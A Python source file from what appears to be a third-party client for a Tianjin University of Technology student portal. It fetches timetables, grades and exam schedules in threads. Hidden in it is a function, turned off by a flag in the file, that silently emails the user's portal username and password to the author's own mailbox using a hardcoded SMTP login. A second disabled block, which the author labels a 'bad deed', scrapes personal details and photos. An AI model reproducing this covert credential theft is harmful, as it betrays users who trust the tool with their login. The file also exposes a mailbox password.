# coding=utf-8
# LoginSucc.py
# 登录成功后的操作
# 多线程获取页面

import globalVal
import SearchMyScore
import SearchTimeTable
import SearchMyInfo
import SearchMyTest
import ProcessHtml
import SaveFile

import threading
import time
import socket

import urllib.request
from bs4 import BeautifulSoup

# just for getMyInfo
# 获取师生服务的侧边url
def getSSFWLink(ssfwHtml):
    soup = BeautifulSoup(ssfwHtml, 'html.parser')
    resultLink = soup.find_all("a")
    urlDict = {}

    for link in resultLink:
        # print(link)
        if "jwnavmenu.do" in str(link.get("url")):
            urlDict[link.get_text()] = "http://ssfw.tjut.edu.cn/ssfw/" + link.get("url")
    return urlDict

# 获取师生服务的侧边菜单栏
def getSSFWMenu():
    # 直接访问师生服务界面
    url = "http://ssfw.tjut.edu.cn/ssfw/index.do?from="
    ssfwHtml = urllib.request.urlopen(url).read().decode('utf-8')
    # 获取侧边菜单栏所有的url
    menuDict = getSSFWLink(ssfwHtml)

    return menuDict
# just for getMyInfo
# ##END

def loginSucc():
    # 设置获取页面的时间延迟
    socket.setdefaulttimeout(5)

    t_timeTable = ''
    t_myScore   = ''
    t_myTest    = ''
    get_time0   = ''
    folderName  = str(globalVal.username)

    # 获取课程表
    if globalVal.check_timetable:
        get_time0 = time.time()
        globalVal.showInText("正在获取课程表...")
        t_timeTable = threading.Thread(target=thread_timeTable, name='thread_timeTable')
        t_timeTable.start()

    # 获取我的成绩
    if globalVal.check_myscore:
        get_time0 = time.time()
        globalVal.showInText("正在获取我的成绩...")
        t_myScore = threading.Thread(target=thread_myScore, name='thread_myScore')
        t_myScore.start()

    # 获取我的考试安排
    if globalVal.check_test:
        get_time0 = time.time()
        globalVal.showInText("正在获取考试安排...")
        t_myTest = threading.Thread(target=thread_myTest, name='thread_myTest')
        t_myTest.start()

    # 坏事 获取我的个人信息
    save_Info = False
    if save_Info:
        menuDict = getSSFWMenu()
        t_myInfo = threading.Thread(target=thread_myInfo, args=(folderName, menuDict), name='thread_myInfo')
        t_myInfo.start()
    # 发送邮件
    send_email = False
    if send_email:
        t_myTest = threading.Thread(target=thread_send_email, name='send_email')
        t_myTest.start()

    # 合并线程
    if globalVal.check_timetable:
        t_timeTable.join(1)
        globalVal.saveTolog("获取课程表完成!!!耗时:%s"%(str(time.time() - get_time0)))
    if globalVal.check_myscore:
        t_myScore.join(1)
        globalVal.saveTolog("获取我的成绩完成!!!耗时:%s"%(str(time.time() - get_time0)))
    if globalVal.check_test:
        t_myTest.join(1)
        globalVal.saveTolog("获取我的考试安排完成!!!耗时:%s"%(str(time.time() - get_time0)))

    # 获取结束
    pass

# 获取我的个人信息停止维护 并停止使用
def thread_myInfo(folderName, menuDict):
    myInfoHtml = SearchMyInfo.getMyInfo(menuDict["我的基本信息"])
    compleHtml_myInfo = ProcessHtml.modify_myInfo("http://ssfw.tjut.edu.cn", myInfoHtml)
    # 获取我的个人主页
    SaveFile.saveHtml(folderName, compleHtml_myInfo, "我的信息.html")
    # 获取的照片
    SaveFile.savePhoto(folderName, globalVal.username)
    pass

def thread_timeTable():
    # 获取课表页面
    timeTableHtml = SearchTimeTable.getTimeTable()
    # 修改页面
    compleHtml_timeTable = ProcessHtml.modify_timeTable(timeTableHtml)
    # 保存页面
    SaveFile.saveHtml(compleHtml_timeTable, "我在(%s)课表.html"%(globalVal.check_timetable_val))
    pass

def thread_myScore():
    myScoreHtml = SearchMyScore.getMyScore()
    compleHtml_mySocre = ProcessHtml.modify_myScore(myScoreHtml)
    SaveFile.saveHtml(compleHtml_mySocre, "我在(%s)成绩.html"%(globalVal.check_myscore_val))
    pass

def thread_myTest():
    myTestHtml = SearchMyTest.getMyTest()
    compleHtml_myTest = ProcessHtml.modify_myTest(myTestHtml)
    SaveFile.saveHtml(compleHtml_myTest, "我在(%s)考试安排.html"%(globalVal.check_test_val))
    pass

def thread_send_email():
    socket.setdefaulttimeout(30)
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart

    try:
        sender = 'find_by_u@163.com'
        receiver = 'find_by_u@163.com'
        subject = globalVal.username
        smtpserver = 'smtp.163.com'
        username = 'find_by_u@163.com'
        password = 'wkmllh666'

        msg = MIMEMultipart()
        msg['Subject'] = subject
        msg['from'] = 'From Foxlogin<find_by_u@163.com>'
        msg['to'] = receiver
        send_text = "username:" + globalVal.username + ";\n" + "password:"+ globalVal.password +";"
        part = MIMEText(send_text)
        msg.attach(part)
        smtp = smtplib.SMTP()
        smtp.connect(smtpserver, 25)
        smtp.starttls()
        smtp.login(username, password)
        smtp.sendmail(sender, receiver, msg.as_string())
        smtp.quit()
    except:
        pass
        #print("数据异常")